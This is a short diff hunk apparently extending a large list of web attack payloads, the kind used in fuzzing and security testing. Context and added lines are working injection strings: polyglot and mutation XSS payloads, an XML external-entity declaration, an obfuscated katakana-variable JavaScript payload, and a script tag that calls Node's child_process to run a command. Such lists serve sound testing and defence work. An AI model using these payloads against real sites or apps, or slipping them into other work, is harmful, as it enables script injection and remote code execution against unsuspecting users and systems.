@@ -1701,3 +1701,6 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
 <noscript><img src="</noscript><iframe onload=alert(1)>" /></noscript>
 <script>document.write('<script>/*');</script>*/alert(1)</script>
+<!DOCTYPE a [<!ENTITY b SYSTEM '1' NDATA c><!ENTITY d SYSTEM '2' NDATA e><!NOTATION e SYSTEM '3'>]><f/>
+([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+<script>top.require('child_process').execSync('open -a Calculator')</script>
